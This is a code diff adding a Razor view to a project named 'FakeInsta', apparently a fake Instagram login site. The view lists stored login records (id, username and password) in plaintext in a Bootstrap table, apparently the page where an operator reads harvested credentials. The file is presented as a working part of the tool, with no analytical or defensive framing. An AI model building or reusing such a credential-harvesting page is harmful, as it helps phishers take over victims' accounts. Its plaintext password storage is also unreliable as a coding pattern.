@@ -1,0 +1,23 @@
+﻿@model IEnumerable<FakeInsta.Models.LoginInfo>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+      integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+<table class="table table-hover w-100">
+    <thead>
+        <tr>
+            <th scope="col">#</th>
+            <th scope="col">Username</th>
+            <th scope="col">Password</th>
+        </tr>
+    </thead>
+    <tbody>
+        @foreach (var item in Model)
+        {
+            <tr>
+                <td scope="col">@item.id</td>
+                <td scope="col">@item.username</td>
+                <td scope="col">@item.password</td>
+            </tr>
+        }
+    </tbody>
+</table>
